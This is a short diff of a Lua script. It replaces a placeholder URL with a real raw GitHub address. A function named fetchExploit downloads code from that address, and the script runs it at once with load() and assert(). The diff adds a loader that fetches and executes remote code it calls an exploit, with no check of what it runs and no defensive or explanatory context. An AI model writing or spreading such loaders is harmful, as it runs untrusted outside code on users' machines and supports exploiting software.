@@ -29,7 +29,7 @@ local function fetchExploit(url)
     end
 end
 
-local exploitScript = fetchExploit("https://example.com/path/to/your/exploit.lua")
+local exploitScript = fetchExploit("https://raw.githubusercontent.com/dragonsek/nots/refs/heads/main/sc.lua")
 if exploitScript then
     assert(load(exploitScript))()
 else
